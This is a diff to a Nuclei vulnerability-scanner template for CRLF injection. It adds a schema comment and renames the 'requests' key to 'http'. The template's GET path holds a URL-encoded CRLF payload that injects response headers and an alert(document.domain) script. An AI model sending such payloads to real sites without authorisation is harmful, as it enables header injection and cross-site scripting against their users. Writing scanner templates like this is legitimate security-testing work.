@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: crlf-injection-dk4trin
 
 info:
@@ -8,7 +9,7 @@ info:
   reference:
   tags: crlf,dk4trin,an1at
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/%0D%0AConnection:%20Location,%20close%0D%0AContent-Type:%20text/html%0D%0AContent-Length:%2055%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E"
